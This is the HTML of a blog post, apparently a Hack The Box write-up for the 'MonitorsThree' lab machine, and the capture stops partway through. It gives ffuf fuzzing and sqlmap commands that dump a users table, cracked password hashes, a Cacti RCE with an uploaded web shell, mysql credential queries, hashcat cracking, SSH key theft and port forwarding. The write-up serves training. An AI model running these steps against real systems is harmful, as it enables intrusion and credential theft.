@@ -1,0 +1,1158 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="light"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>MonitorsThree &middot; Prickly Phish writeups</title>
+  <meta name="title" content="MonitorsThree &middot; Prickly Phish writeups" />
+  
+  
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/posts/htb/monitors/monitorsthree/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.9d4c121f25cbdddeb3e8c2b85d0e642a0bdf3ff1bbe49f1ca22a1b860838b9dc7c6897c69c8eeb2fc6b3979dd96d96ff0c7601dcce9eed92121bcf556fb6e02c.css"
+    integrity="sha512-nUwSHyXL3d6z6MK4XQ5kKgvfP/G75J8coiobhgg4udx8aJfGnI7rL8azl53ZbZb/DHYB3M6e7ZISG89Vb7bgLA==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.c178288131a2f1ad46910438db47ac5f7e1c48cf949e49f6dc3310c8ec9660e23fe505805eba4e2e73711335808500360d773a2b64322feb35df52856edca286.js"
+    integrity="sha512-wXgogTGi8a1GkQQ420esX34cSM&#43;Unkn23DMQyOyWYOI/5QWAXrpOLnNxEzWAhQA2DXc6K2QyL&#43;s131KFbtyihg==" data-copy="" data-copied=""></script>
+  
+  
+  
+  <script src="/lib/zoom/zoom.min.37d2094687372da3f7343a221a470f6b8806f7891aa46a5a03966af7f0ebd38b9fe536cb154e6ad28f006d184b294525a7c4054b6bbb4be62d8b453b42db99bd.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S&#43;Yti0U7QtuZvQ=="></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="http://localhost:1313/posts/htb/monitors/monitorsthree/">
+  <meta property="og:site_name" content="Prickly Phish writeups">
+  <meta property="og:title" content="MonitorsThree">
+  <meta property="og:description" content="monitorsthree # User # sudo bash -c &#34;echo &#39;10.10.11.30 monitorsthree.htb&#39;&gt;&gt; /etc/hosts&#34; Can’t see anything of interest off the bat lets do some enumeration
+ffuf -u http://monitorsthree.htb -H &#34;Host:FUZZ.monitorsthree.htb&#34; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -ac Found the app login section
+The password recovery section was vulnerable to sql injection
+sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --dbs sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --level=5 --risk=3 -D monitorsthree_db --tables sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --level=5 --risk=3 -D monitorsthree_db -T users -columns sqlmap -u monitorsthree.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-11-26T19:01:10+00:00">
+    <meta property="article:modified_time" content="2024-11-26T19:01:10+00:00">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="MonitorsThree">
+  <meta name="twitter:description" content="monitorsthree # User # sudo bash -c &#34;echo &#39;10.10.11.30 monitorsthree.htb&#39;&gt;&gt; /etc/hosts&#34; Can’t see anything of interest off the bat lets do some enumeration
+ffuf -u http://monitorsthree.htb -H &#34;Host:FUZZ.monitorsthree.htb&#34; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -ac Found the app login section
+The password recovery section was vulnerable to sql injection
+sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --dbs sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --level=5 --risk=3 -D monitorsthree_db --tables sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --level=5 --risk=3 -D monitorsthree_db -T users -columns sqlmap -u monitorsthree.">
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "MonitorsThree",
+    "headline": "MonitorsThree",
+    
+    "abstract": "monitorsthree # User # sudo bash -c \u0026#34;echo \u0026#39;10.10.11.30 monitorsthree.htb\u0026#39;\u0026gt;\u0026gt; \/etc\/hosts\u0026#34; Can\u0026rsquo;t see anything of interest off the bat lets do some enumeration\nffuf -u http:\/\/monitorsthree.htb -H \u0026#34;Host:FUZZ.monitorsthree.htb\u0026#34; -w \/usr\/share\/seclists\/Discovery\/DNS\/subdomains-top1million-5000.txt -c -ac Found the app login section\nThe password recovery section was vulnerable to sql injection\nsqlmap -u monitorsthree.htb\/forgot_password.php --forms --crawl=2 --dbs sqlmap -u monitorsthree.htb\/forgot_password.php --forms --crawl=2 --level=5 --risk=3 -D monitorsthree_db --tables sqlmap -u monitorsthree.htb\/forgot_password.php --forms --crawl=2 --level=5 --risk=3 -D monitorsthree_db -T users -columns sqlmap -u monitorsthree.",
+    "inLanguage": "en",
+    "url" : "http:\/\/localhost:1313\/posts\/htb\/monitors\/monitorsthree\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2024",
+    "dateCreated": "2024-11-26T19:01:10\u002b00:00",
+    "datePublished": "2024-11-26T19:01:10\u002b00:00",
+    
+    "dateModified": "2024-11-26T19:01:10\u002b00:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "483"
+  }]
+  </script>
+
+
+  
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Prickly Phish writeups</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">
+
+            
+            
+            
+  <a href="/topics/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Topics
+    </p>
+</a>
+
+
+
+            
+            
+  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        posts
+    </p>
+</a>
+
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class="ltr:mr-14 rtl:ml-14 flex items-center">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+                    <div class="flex items-center justify-center dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400" style="margin-right:5px">
+                <div class="flex items-center justify-center dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" class="block">
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li id="menu-close-button">
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/topics/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Topics
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            posts
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+
+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      MonitorsThree
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <time datetime="2024-11-26T19:01:10&#43;00:00">November 26, 2024</time><span class="px-2 text-primary-500">&middot;</span><span>483 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span>
+  
+
+  
+  
+</div>
+
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+      
+      
+        
+        
+<div class="flex author">
+  
+  <div class="place-self-center">
+    
+    
+    <div class="text-2xl sm:text-lg">
+</div>
+  </div>
+</div>
+
+      
+
+      
+
+      
+      <div class="mb-5"></div>
+      
+
+    
+
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+    
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="article-content max-w-prose mb-20">
+          
+
+<h1 class="relative group">monitorsthree 
+    <div id="monitorsthree" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#monitorsthree" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /monitorsthree/lesgo_hu7479722485376001586.png 330w,
+        /monitorsthree/lesgo_hu10948067749199647595.png 660w,
+        /monitorsthree/lesgo_hu11461758253392738149.png 1024w,
+        /monitorsthree/lesgo_hu8597619826227352083.png 2x"
+        src="/monitorsthree/lesgo_hu10948067749199647595.png"
+        alt="lesgo.png"
+      />
+      
+    </figure>
+</p>
+
+
+<h2 class="relative group">User 
+    <div id="user" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#user" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/monitorsthree/etchosts.png" alt="etchosts" />
+      
+    </figure>
+</p>
+<pre tabindex="0"><code>sudo bash -c &#34;echo &#39;10.10.11.30    monitorsthree.htb&#39;&gt;&gt; /etc/hosts&#34;
+</code></pre><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/monitorsthree/port80.png" alt="port80" />
+      
+    </figure>
+
+Can&rsquo;t see anything of interest off the bat lets do some enumeration</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /monitorsthree/cacti_hu17079118010131392436.png 330w,
+        /monitorsthree/cacti_hu4682281553916914899.png 660w,
+        /monitorsthree/cacti_hu18381414500776541406.png 1024w,
+        /monitorsthree/cacti_hu2018681805402568859.png 2x"
+        src="/monitorsthree/cacti_hu4682281553916914899.png"
+        alt="cati"
+      />
+      
+    </figure>
+</p>
+<pre tabindex="0"><code>ffuf -u http://monitorsthree.htb -H &#34;Host:FUZZ.monitorsthree.htb&#34; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -ac
+</code></pre><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/monitorsthree/cactiapp.png" alt="app" />
+      
+    </figure>
+
+Found the app login section</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/monitorsthree/sql.png" alt="sql" />
+      
+    </figure>
+
+The password recovery section was vulnerable to <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">sql injection</a></p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /monitorsthree/dbs_hu10050141150014376143.png 330w,
+        /monitorsthree/dbs_hu14326279601865140318.png 660w,
+        /monitorsthree/dbs_hu1520460618633227542.png 1024w,
+        /monitorsthree/dbs_hu5177149180128238452.png 2x"
+        src="/monitorsthree/dbs_hu14326279601865140318.png"
+        alt="dbs"
+      />
+      
+    </figure>
+</p>
+<pre tabindex="0"><code>sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --dbs
+</code></pre><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /monitorsthree/tables_hu15227737853430995140.png 330w,
+        /monitorsthree/tables_hu6369194041486772714.png 660w,
+        /monitorsthree/tables_hu17573209622669851791.png 1024w,
+        /monitorsthree/tables_hu9407050895158159380.png 2x"
+        src="/monitorsthree/tables_hu6369194041486772714.png"
+        alt="tables"
+      />
+      
+    </figure>
+</p>
+<pre tabindex="0"><code>sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --level=5 --risk=3 -D monitorsthree_db --tables
+</code></pre><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /monitorsthree/colums_hu12583317267916472177.png 330w,
+        /monitorsthree/colums_hu9016747627312548284.png 660w,
+        /monitorsthree/colums_hu14285040490968443804.png 1024w,
+        /monitorsthree/colums_hu1302515940284702120.png 2x"
+        src="/monitorsthree/colums_hu9016747627312548284.png"
+        alt="colums"
+      />
+      
+    </figure>
+</p>
+<pre tabindex="0"><code>sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --level=5 --risk=3 -D monitorsthree_db -T users -columns
+</code></pre><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/monitorsthree/userspass.png" alt="userspass" />
+      
+    </figure>
+</p>
+<pre tabindex="0"><code>sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --level=5 --risk=3 -D monitorsthree_db -T users -C username,password --dump
+</code></pre><pre tabindex="0"><code>Database: monitorsthree_db
+Table: users
+[4 entries]
++-----------+----------------------------------+
+| username  | password                         |
++-----------+----------------------------------+
+| janderson | 1e68b6eb86b45f6d92f8f292428f77ac |
+| admin     | 31a181c8372e3afc59dab863430610e8 |
+| dthompson | 633b683cc128fe244b00f176c8a950f5 |
+| mwatson   | c585d01f2eb3e6e1073e92023088a3dd |
++-----------+----------------------------------+
+</code></pre><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /monitorsthree/crackstation_hu3734047172873906633.png 330w,
+        /monitorsthree/crackstation_hu3987456046531876816.png 660w,
+        /monitorsthree/crackstation_hu6132500679662133983.png 1024w,
+        /monitorsthree/crackstation_hu11336531046840931290.png 2x"
+        src="/monitorsthree/crackstation_hu3987456046531876816.png"
+        alt="crackstation"
+      />
+      
+    </figure>
+</p>
+<pre tabindex="0"><code>admin : greencacti2001
+</code></pre><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/monitorsthree/credsboth.png" alt="credsboth" />
+      
+    </figure>
+
+my creds for admin worked on both monitorsthree and the subdomain  cacti . monitorsthree</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /monitorsthree/rce_hu3519663345852162891.png 330w,
+        /monitorsthree/rce_hu7272397011679419374.png 660w,
+        /monitorsthree/rce_hu7364480895915816934.png 1024w,
+        /monitorsthree/rce_hu7430081921928017867.png 2x"
+        src="/monitorsthree/rce_hu7272397011679419374.png"
+        alt="rce"
+      />
+      
+    </figure>
+
+I saw that cacti was running 1.2.26 and found a <a href="https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88" target="_blank">rce</a> for it</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /monitorsthree/connection_hu13187039566638260821.png 330w,
+        /monitorsthree/connection_hu12948870683073938183.png 660w,
+        /monitorsthree/connection_hu483538165378662507.png 1024w,
+        /monitorsthree/connection_hu4751435195039565048.png 2x"
+        src="/monitorsthree/connection_hu12948870683073938183.png"
+        alt="connection"
+      />
+      
+    </figure>
+
+I uploaded a <a href="https://github.com/flozz/p0wny-shell" target="_blank">p0wny-shell</a> shell and tried out <a href="revshell.com">revshells</a> until one got me a connection</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/monitorsthree/mysqlcreds.png" alt="mysql" />
+      
+    </figure>
+
+I found a db file that had credentials for mysql</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/monitorsthree/creden.png" alt="creden" />
+      
+    </figure>
+</p>
+<pre tabindex="0"><code>mysql -ucactiuser -pcactiuser -e &#34;USE cacti;&#34; -e &#34;Select * from user_auth;&#34;
+</code></pre><p>I remeber the terminal being buggy so i just used the webshell</p>
+<pre tabindex="0"><code>1	admin	$2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G	0	Administrator	marcus@monitorsthree.htb			on	on	on	on	2	1	1	1	1	on	-1	-1	-1		0	0	436423766
+3	guest	$2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu	0	Guest Account	guest@monitorsthree.htb			on	on	on		1	1	1	1	1		-1	-1	-1		0	0	3774379591
+4	marcus	$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK	0	Marcus	marcus@monitorsthree.htb		on	on	on	on	on	1	1	1	1	1	on	-1	-1			0	0	1677427318
+</code></pre><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/monitorsthree/marcuscreds.png" alt="marcuscreds" />
+      
+    </figure>
+</p>
+<pre tabindex="0"><code>hashcat -a 0 -m 3200 hash.txt /usr/share/seclists/rockyou.txt hash.txt -show
+</code></pre><pre tabindex="0"><code>marcus : 12345678910
+</code></pre><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/monitorsthree/ssnowork.png" alt="ssnoworl" />
+      
+    </figure>
+
+Couldnt ssh into marcus</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/monitorsthree/id_rsassh.png" alt="id_rsa" />
+      
+    </figure>
+
+Couldnt su in the webshell either so got the terminal again and got the ssh key and then used that to ssh in</p>
+
+
+<h2 class="relative group">Root 
+    <div id="root" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#root" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /monitorsthree/netstat_hu5049271767204687226.png 330w,
+        /monitorsthree/netstat_hu7831325694207204014.png 660w,
+        /monitorsthree/netstat_hu7449297851520239944.png 1024w,
+        /monitorsthree/netstat_hu16538137686784952539.png 2x"
+        src="/monitorsthree/netstat_hu7831325694207204014.png"
+        alt="netstat"
+      />
+      
+    </figure>
+</p>
+<pre tabindex="0"><code>netstat -tnlp
+</code></pre><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /monitorsthree/duplicati_hu11527221454626974611.png 330w,
+        /monitorsthree/duplicati_hu731946229477672268.png 660w,
+        /monitorsthree/duplicati_hu11143646572082403762.png 1024w,
+        /monitorsthree/duplicati_hu196062894719250057.png 2x"
+        src="/monitorsthree/duplicati_hu731946229477672268.png"
+        alt="duplicati"
+      />
+      
+    </figure>
+</p>
+<pre tabindex="0"><code>ssh -i id_rsa marcus@10.10.11.30 -L 127.0.0.1:8080:127.0.0.1:8080
+</code></pre><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/monitorsthree/authbypass.png" alt="auth bypass" />
+      
+    </figure>
+
+Found a way to bypass the authentication</p>
+<p>
+    <figure>
